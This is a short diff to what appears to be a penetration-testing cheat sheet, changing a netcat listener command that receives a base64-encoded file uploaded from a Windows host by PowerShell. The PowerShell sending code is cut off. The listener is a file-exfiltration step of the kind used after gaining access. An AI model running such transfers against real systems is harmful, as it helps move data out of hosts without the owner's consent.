@@ -1058,7 +1058,7 @@ Execute `dl.exe` to retrieve the file.
 ## >> Uploading a file via powershell
 
 Start netcat listener on Linux (10.192.103.49).<br />
-`nc -nlvp 4444 | base64 -di > file.bin`
+`nc -nlvp 4444 | fold -w 76 | base64 -d > file.bin`
 
 Send the file from Windows host using powershell.<br />
 ```powershell
